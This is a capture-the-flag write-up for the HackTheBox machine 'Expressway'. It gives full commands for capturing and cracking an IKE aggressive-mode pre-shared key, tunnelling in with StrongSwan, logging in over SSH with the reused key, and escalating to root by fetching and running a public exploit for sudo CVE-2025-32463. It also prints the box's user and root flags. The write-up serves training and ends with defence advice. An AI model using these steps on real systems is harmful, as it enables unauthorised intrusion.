# HTB - Expressway - 10.129.186.188

## Expressway

> **Platform:** HackTheBox **Difficulty:** Medium **OS:** Linux (Debian) **Key Techniques:** IPsec VPN Enumeration, IKEv1 Aggressive Mode, PSK Cracking, StrongSwan Tunnel, CVE-2025-32463 (sudo LPE)

***

### Box Info

| Property   | Value                              |
| ---------- | ---------------------------------- |
| IP         | `10.129.186.188`                   |
| OS         | Debian (Kernel 6.16.7+deb14-amd64) |
| Difficulty | Medium                             |
| User Flag  | `96d325014096aae6758c7f7749ada3a5` |
| Root Flag  | `54cc1b02f44ca0363cc60655b3765bb5` |

***

### Attack Chain Overview

```
UDP 500/4500 Open → IKE Aggressive Mode Scan → PSK Hash Extracted →
PSK Cracked (freakingrockstarontheroad) → StrongSwan IPsec Tunnel Established →
Post-VPN TCP Scan → SSH as ike with cracked PSK → User Flag →
sudo 1.9.17 → CVE-2025-32463 (sudo LPE) → Root
```

***

### Reconnaissance

#### Initial Scan — IPsec VPN Discovery

The initial scan revealed UDP ports 500 (ISAKMP) and 4500 (NAT-T) open, indicating an **IPsec VPN endpoint** using IKE (Internet Key Exchange) for tunnel negotiation.

**What is IPsec/IKE?**

IPsec (Internet Protocol Security) is a protocol suite that encrypts and authenticates IP traffic between two endpoints. IKE (Internet Key Exchange) is the negotiation protocol that establishes the shared encryption keys and security parameters before the tunnel can carry traffic. IKE runs on UDP port 500, and NAT Traversal uses port 4500.

There are two IKE negotiation modes: **Main Mode** (6-message exchange, more secure, hides identities) and **Aggressive Mode** (3-message exchange, faster, but exposes the Pre-Shared Key hash to anyone who can sniff the handshake). Aggressive Mode is the attack vector here.

***

### Foothold — IPsec VPN Tunnel Establishment

#### Phase 1: Discover IPsec Configuration

**Scan with ike-scan to determine supported transforms:**

```bash
ike-scan -M -A 10.129.186.188
```

| Flag | Purpose                                           |
| ---- | ------------------------------------------------- |
| `-M` | Multiline output for readability                  |
| `-A` | Use Aggressive Mode (triggers XAuth if supported) |

**Key findings from the scan:**

| Parameter      | Value                |
| -------------- | -------------------- |
| Encryption     | 3DES                 |
| Hash           | SHA1                 |
| DH Group       | modp1024 (Group 2)   |
| Authentication | PSK (Pre-Shared Key) |
| ID Type        | ID\_USER\_FQDN       |
| Group Name     | `ike@expressway.htb` |

The target supports Aggressive Mode with PSK authentication, which means we can extract the PSK hash.

#### Phase 2: Extract and Crack the PSK Hash

**What is a PSK Hash in IKE Aggressive Mode?**

In Aggressive Mode, the responder includes a hash of the Pre-Shared Key in its reply message. Unlike Main Mode, this hash is transmitted before the encrypted channel is established, meaning anyone who intercepts (or initiates) the handshake can capture the hash and crack it offline. This is the fundamental weakness of IKE Aggressive Mode with PSK.

**Extract the PSK hash:**

```bash
ike-scan -M -A -n ike@expressway.htb --pskcrack=test.txt 10.129.186.188
```

| Flag                    | Purpose                                                                    |
| ----------------------- | -------------------------------------------------------------------------- |
| `-n ike@expressway.htb` | Specify the group name / identity (required for Aggressive Mode handshake) |
| `--pskcrack=test.txt`   | Save the captured PSK hash to a file for offline cracking                  |

**Crack the hash:**

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt test.txt
```

**Result:** `freakingrockstarontheroad`

#### Phase 3: Configure StrongSwan IPsec Tunnel

**What is StrongSwan?**

StrongSwan is an open-source IPsec implementation for Linux. It acts as an IKE daemon that can negotiate and establish IPsec tunnels. We use it to connect to the target's VPN endpoint using the cracked PSK, gaining access to services that are only available through the encrypted tunnel.

**Step 1: Install StrongSwan:**

```bash
sudo apt install strongswan -y
```

**Step 2: Configure the Pre-Shared Key:**

```bash
sudo tee /etc/ipsec.secrets > /dev/null <<EOF
10.129.186.188 : PSK "freakingrockstarontheroad"
EOF
```

**Step 3: Configure the tunnel:**

```bash
sudo tee /etc/ipsec.conf > /dev/null <<EOF
config setup
    charondebug="ike 2, knl 2, cfg 2, net 2, esp 2, dmn 2, mgr 2"

conn expressway
    keyexchange=ikev1
    type=transport
    authby=psk
    left=%defaultroute
    right=10.129.186.188
    ike=3des-sha1-modp1024
    esp=3des-sha1
    auto=start
EOF
```

| Directive                | Purpose                                                             |
| ------------------------ | ------------------------------------------------------------------- |
| `keyexchange=ikev1`      | Use IKEv1 (matched from ike-scan output)                            |
| `type=transport`         | IPsec transport mode (encrypt traffic between hosts, no new subnet) |
| `authby=psk`             | Authenticate with Pre-Shared Key                                    |
| `left=%defaultroute`     | Auto-detect attacker's IP                                           |
| `right=10.129.186.188`   | Target VPN gateway IP                                               |
| `ike=3des-sha1-modp1024` | IKE Phase 1 transform (must match scan results exactly)             |
| `esp=3des-sha1`          | ESP Phase 2 transform                                               |
| `charondebug=...`        | Verbose logging for troubleshooting                                 |

**Step 4: Establish the tunnel:**

```bash
sudo ipsec restart
sudo ipsec up expressway
```

**Verify connectivity:**

```bash
ip a | grep tun
ip route
```

#### Phase 4: Post-VPN Enumeration

Once the tunnel is up, services previously hidden behind the VPN become accessible. Nmap scans through IPsec tunnels **must use TCP connect scan** (`-sT`) because SYN scans (`-sS`) don't work properly through the encrypted transport:

```bash
sudo nmap -sT -Pn -n -p- 10.129.186.188 -oN vpn_fullscan.nmap
```

This revealed SSH (port 22) and additional services accessible through the tunnel.

#### Phase 5: SSH Access

The cracked PSK doubled as the password for the `ike` user:

```bash
ssh ike@10.129.186.188
# Password: freakingrockstarontheroad
```

***

### User Flag

```
ike@expressway:~$ cat user.txt
96d325014096aae6758c7f7749ada3a5
```

***

### Post-Exploitation Enumeration

#### System Information

| Property | Value                             |
| -------- | --------------------------------- |
| Kernel   | 6.16.7+deb14-amd64                |
| Sudo     | 1.9.17 (`/usr/local/bin/sudo`)    |
| Exim     | 4.98.2 (SUID, running on port 25) |

#### Available Binaries

Enumeration of useful tools on the system:

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Notable: `gcc`, `g++`, `make` are available (can compile exploits on-target), `ctr` and `runc` present (container tools).

#### SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

| Binary                | Notes                                         |
| --------------------- | --------------------------------------------- |
| `/usr/sbin/exim4`     | Mail server, SUID root, running on port 25    |
| `/usr/local/bin/sudo` | Sudo 1.9.17, also SUID                        |
| Standard bins         | passwd, mount, su, umount, chfn, chsh, newgrp |

#### Failed Attempt: Exim 4.88 Exploit

Initial enumeration suggested Exim might be an older vulnerable version. The symlink chain `/usr/sbin/exim → exim4` was investigated:

```bash
ls -al /usr/sbin/exim
# lrwxrwxrwx 1 root root 5 Aug 14 12:58 /usr/sbin/exim -> exim4
```

A `searchsploit exim 4.88` returned CVE-2019-10149 (PacketStorm 153312), but the actual running version was **4.98.2**, not 4.88. The exploit did not apply.

***

### Privilege Escalation — CVE-2025-32463 (sudo 1.9.17 LPE)

#### What is CVE-2025-32463?

CVE-2025-32463 is a local privilege escalation vulnerability in sudo versions up to and including 1.9.17. The exploit takes advantage of how sudo handles certain operations, allowing a local user to escalate to root. The vulnerability was disclosed in 2025 and affects the exact version running on this box.

#### Why it works

Sudo 1.9.17 (installed at `/usr/local/bin/sudo`) is SUID root. The CVE exploits a flaw in sudo's processing logic that allows a crafted invocation to bypass permission checks and execute commands as root.

#### Exploitation

**Transfer the exploit to the target:**

```bash
# On attacker
git clone https://github.com/kh4sh3i/CVE-2025-32463.git
cd CVE-2025-32463
# Transfer exploit.sh to target via wget/curl/scp
```

**Execute on target:**

```bash
chmod +x exploit.sh
id
# uid=1000(ike) gid=1000(ike) groups=1000(ike)

./exploit.sh
id
# uid=0(root) gid=0(root) groups=0(root)
```

***

### Root Flag

```
root@expressway:/root# cat root.txt
54cc1b02f44ca0363cc60655b3765bb5
```

***

### Quick Reference

```bash
# === VPN DISCOVERY & CRACKING ===
# Aggressive mode scan
ike-scan -M -A <TARGET>

# Extract PSK hash with group name
ike-scan -M -A -n <GROUP_NAME> --pskcrack=hash.txt <TARGET>

# Crack PSK
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt

# === STRONGSWAN TUNNEL ===
# /etc/ipsec.secrets
# <TARGET> : PSK "<CRACKED_PSK>"

# /etc/ipsec.conf
# conn <name>
#   keyexchange=ikev1
#   type=transport
#   authby=psk
#   left=%defaultroute
#   right=<TARGET>
#   ike=3des-sha1-modp1024
#   esp=3des-sha1
#   auto=start

# Start tunnel
sudo ipsec restart
sudo ipsec up <CONN_NAME>

# Verify
ip a | grep tun
ip route

# === POST-VPN SCANNING ===
# Must use -sT (TCP connect) through IPsec tunnels
sudo nmap -sT -Pn -n -p- <TARGET> -oN vpn_fullscan.nmap

# === SSH ===
ssh ike@<TARGET>

# === PRIVESC ===
# Check sudo version
sudo -V | grep "Sudo ver"

# CVE-2025-32463 (sudo <= 1.9.17)
chmod +x exploit.sh && ./exploit.sh
```

***

### Troubleshooting

| Issue                                                     | Solution                                                                                                                                                                                           |
| --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ike-scan returns no handshake                             | The target may only respond to specific transforms. Try different encryption/hash/group combinations. Ensure you're scanning UDP 500                                                               |
| Aggressive Mode requires group name but you don't know it | Try common defaults: `vpn`, `GroupVPN`, `ike`. Check for FQDN patterns in DNS or email headers. Some targets leak the ID in the initial response                                                   |
| PSK hash won't crack                                      | Verify the hash file format is correct. Try larger wordlists or rule-based attacks with hashcat (`-m 5300` for IKEv1 PSK)                                                                          |
| StrongSwan tunnel fails to establish                      | Verify `ike=` and `esp=` transforms match exactly what ike-scan reported. Check `charondebug` logs in `/var/log/syslog`. Ensure UDP 500 and 4500 aren't blocked by your firewall                   |
| Tunnel up but can't reach services                        | Verify routes with `ip route`. Try `ping` through the tunnel. Some services may bind to localhost only — check with a post-VPN scan                                                                |
| Nmap SYN scan fails through tunnel                        | IPsec transport mode doesn't support raw sockets well. Always use `-sT` (TCP connect) for scans through IPsec                                                                                      |
| Exim exploit fails                                        | Verify the actual version: `exim4 -bV`. Symlink names can be misleading. The running version (4.98.2) is much newer than the exploit target (4.88)                                                 |
| CVE-2025-32463 exploit fails                              | Verify sudo version matches (`sudo -V`). Check that `/usr/local/bin/sudo` is the SUID binary (not `/usr/bin/sudo`). Ensure exploit.sh has execute permissions and gcc is available for compilation |

***

### Key Takeaways

**What we learned:**

1. **IKE Aggressive Mode leaks PSK hashes** — Unlike Main Mode, Aggressive Mode transmits the PSK hash before encryption is established. Any attacker who can reach UDP 500 can capture and crack it offline. This is why Aggressive Mode with PSK should never be used on internet-facing VPN endpoints
2. **Cracked VPN credentials often lead to system access** — The PSK (`freakingrockstarontheroad`) was reused as the SSH password for the `ike` user, demonstrating the compound risk of credential reuse across authentication layers
3. **IPsec tunnels hide attack surface** — Services like SSH and SMTP were only accessible after establishing the VPN tunnel, showing how VPN-protected services can create a false sense of security if the VPN authentication itself is weak
4. **Scanning through IPsec requires TCP connect scans** — Raw socket / SYN scans don't work properly through IPsec transport mode. Always use `nmap -sT` when scanning through VPN tunnels
5. **Always verify exact software versions** — The Exim binary name/symlinks were misleading. The actual version (4.98.2) was much newer than the exploit target (4.88). Always run `<binary> --version` before attempting exploits
6. **Keep sudo updated** — CVE-2025-32463 in sudo 1.9.17 provided trivial root escalation. Sudo is one of the most common privilege escalation vectors on Linux

**Attack chain summary:**

```
IKE Aggressive Mode → PSK Hash Capture → Crack PSK → StrongSwan Tunnel →
SSH as ike (password reuse) → sudo 1.9.17 CVE-2025-32463 → Root
```

**Defense recommendations:**

* Never use IKE Aggressive Mode on internet-facing VPN endpoints — use Main Mode or migrate to IKEv2, which doesn't have this weakness
* Use strong, randomly generated PSKs (minimum 20+ characters) or certificate-based authentication instead of PSK
* Never reuse VPN credentials for system authentication (SSH, etc.)
* Restrict UDP 500/4500 access to known IP ranges if possible
* Update sudo to the latest patched version (1.9.18+ fixes CVE-2025-32463)
* Remove SUID from sudo if an alternative privilege escalation mechanism (like polkit) is available
* Ensure compiler tools (gcc, make) are not installed on production systems — they enable on-target exploit compilation
* Monitor IPsec VPN authentication logs for brute-force or repeated Aggressive Mode handshake attempts

***

### Related Topics

* \[\[IPsec VPN]]
* \[\[IKE Aggressive Mode]]
* \[\[ike-scan]]
* \[\[StrongSwan]]
* \[\[Pre-Shared Key Cracking]]
* \[\[CVE-2025-32463]]
* \[\[Sudo Privilege Escalation]]
* \[\[VPN Pivoting]]
* \[\[Exim Mail Server]]
* \[\[SUID Binaries]]

***

### Tags

`#vpn` `#ipsec` `#ikev1` `#aggressive-mode` `#psk-cracking` `#strongswan` `#tunnel` `#cve-2025-32463` `#sudo` `#suid` `#pivoting` `#htb-medium` `#linux`
